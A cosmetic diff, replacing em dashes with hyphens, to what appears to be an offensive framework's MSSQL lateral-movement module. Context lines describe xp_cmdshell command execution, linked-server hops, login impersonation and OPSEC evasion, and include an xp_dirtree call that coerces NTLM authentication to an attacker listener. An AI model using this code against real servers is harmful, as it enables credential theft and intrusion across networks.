@@ -1,17 +1,17 @@
 """
-MSSQL Lateral Movement — lateral.mssql
-MITRE: T1505.001 — SQL Stored Procedures (xp_cmdshell)
+MSSQL Lateral Movement - lateral.mssql
+MITRE: T1505.001 - SQL Stored Procedures (xp_cmdshell)
 
 Lateral movement via Microsoft SQL Server exploitation:
-  1. xp_cmdshell — enable via sp_configure and execute OS commands as SQL service account
-  2. Linked server hop — lateral movement through SQL server trust relationships
-  3. EXECUTE AS LOGIN — impersonate SA or privileged login
-  4. UNC path injection — coerce NTLM auth to attacker listener via xp_dirtree/bulk insert
+  1. xp_cmdshell - enable via sp_configure and execute OS commands as SQL service account
+  2. Linked server hop - lateral movement through SQL server trust relationships
+  3. EXECUTE AS LOGIN - impersonate SA or privileged login
+  4. UNC path injection - coerce NTLM auth to attacker listener via xp_dirtree/bulk insert
 
 Prerequisites: SQL credentials (SA or db_owner). Port 1433 accessible.
                KnowledgeBase entry kb-mssql already exists.
 
-OPSEC: MEDIUM — SQL queries appear legitimate in server logs.
+OPSEC: MEDIUM - SQL queries appear legitimate in server logs.
        xp_cmdshell re-enable is logged by SQL Audit if enabled.
 """
 from __future__ import annotations
@@ -48,7 +48,7 @@ logger = get_logger("ares.modules.lateral.mssql")
 )
 class MSSQLModule(BaseModule):
     """
-    lateral.mssql — MSSQL lateral movement via xp_cmdshell, linked servers, EXECUTE AS LOGIN, and UNC path NTLM coer
+    lateral.mssql - MSSQL lateral movement via xp_cmdshell, linked servers, EXECUTE AS LOGIN, and UNC path NTLM coer
 
     OPSEC: MEDIUM
     MITRE: "T1505.001"
@@ -77,13 +77,13 @@ class MSSQLModule(BaseModule):
         target = getattr(ctx, "target", "") or ctx.params.get("target", "")
         if not target:
             raise ModuleValidationError(
-                "lateral.mssql requires 'target' — IP or hostname of MSSQL server.",
+                "lateral.mssql requires 'target' - IP or hostname of MSSQL server.",
                 module_id=self.MODULE_ID, field="target",
             )
         username = ctx.params.get("username", "") or ctx.params.get("sql_user", "")
         if not username:
             raise ModuleValidationError(
-                "lateral.mssql requires SQL credentials — pass 'username' and 'password'. "
+                "lateral.mssql requires SQL credentials - pass 'username' and 'password'. "
                 "Use 'sa' or a db_owner account for xp_cmdshell.",
                 module_id=self.MODULE_ID, field="username",
             )
@@ -357,7 +357,7 @@ class MSSQLModule(BaseModule):
 
     def _enum_server_sync(self, target: str, username: str, password: str,
                            port: int) -> dict:
-        """Connect to MSSQL and enumerate server info. Sync — runs in executor."""
+        """Connect to MSSQL and enumerate server info. Sync - runs in executor."""
         try:
             import impacket.tds as tds  # type: ignore[import]
 
@@ -399,7 +399,7 @@ class MSSQLModule(BaseModule):
             return info
 
         except ImportError:
-            # impacket TDS not available — try pymssql fallback
+            # impacket TDS not available - try pymssql fallback
             return self._enum_pymssql(target, username, password, port)
         except Exception as exc:
             raise  # propagate to async wrapper for _classify_error
@@ -425,7 +425,7 @@ class MSSQLModule(BaseModule):
             conn.close()
             return info
         except ImportError:
-            return {"error": "No MSSQL driver available — pip install pymssql"}
+            return {"error": "No MSSQL driver available - pip install pymssql"}
         except Exception as exc:
             raise  # propagate to async wrapper for _classify_error
 
@@ -493,7 +493,7 @@ class MSSQLModule(BaseModule):
             try:
                 cur.execute(f"EXEC xp_dirtree '\\\\{listener_ip}\\share'")
             except Exception:
-                pass   # expected — NTLM sent before this fails
+                pass   # expected - NTLM sent before this fails
             conn.close()
             return True
         except Exception as exc:
